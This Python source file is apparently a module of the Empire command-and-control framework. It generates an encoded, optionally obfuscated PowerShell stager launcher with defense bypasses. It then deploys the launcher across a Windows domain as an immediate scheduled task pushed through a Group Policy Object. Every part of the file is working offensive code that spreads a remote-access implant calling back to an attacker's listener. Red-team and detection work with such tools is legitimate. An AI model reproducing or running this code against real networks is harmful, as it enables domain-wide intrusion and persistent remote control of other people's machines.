from __future__ import print_function

from builtins import object, str
from typing import Dict

from empire.server.common import helpers
from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):

        # staging options
        module_name = "New-GPOImmediateTask"
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        if (params["Obfuscate"]).lower() == "true":
            launcher_obfuscate = True
        else:
            launcher_obfuscate = False
        launcher_obfuscate_command = params["ObfuscateCommand"]

        if not main_menu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            return handle_error_message("[!] Invalid listener: " + listener_name)

        else:

            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(
                listenerName=listener_name,
                language="powershell",
                encode=True,
                obfuscate=launcher_obfuscate,
                obfuscationCommand=launcher_obfuscate_command,
                userAgent=user_agent,
                proxy=proxy,
                proxyCreds=proxy_creds,
                bypasses=params["Bypasses"],
            )

            command = '/c "' + launcher + '"'

            if command == "":
                return handle_error_message("[!] Error processing command")

            else:
                # read in the common module source code
                script, err = main_menu.modulesv2.get_module_source(
                    module_name=module.script_path,
                    obfuscate=obfuscate,
                    obfuscate_command=obfuscation_command,
                )

                if err:
                    return handle_error_message(err)

                # get just the code needed for the specified function
                script = helpers.generate_dynamic_powershell_script(script, module_name)

                script += (
                    module_name
                    + " -Command cmd -CommandArguments '"
                    + command
                    + "' -Force"
                )

                for option, values in params.items():
                    if option.lower() in [
                        "taskname",
                        "taskdescription",
                        "taskauthor",
                        "gponame",
                        "gpodisplayname",
                        "domain",
                        "domaincontroller",
                    ]:
                        if values and values != "":
                            if values.lower() == "true":
                                # if we're just adding a switch
                                script += " -" + str(option)
                            else:
                                script += " -" + str(option) + " '" + str(values) + "'"

                outputf = params.get("OutputFunction", "Out-String")
                script += (
                    f" | {outputf} | "
                    + '%{$_ + "`n"};"`n'
                    + str(module.name.split("/")[-1])
                    + ' completed!"'
                )

        script = main_menu.modulesv2.finalize_module(
            script=script,
            script_end="",
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
        return script
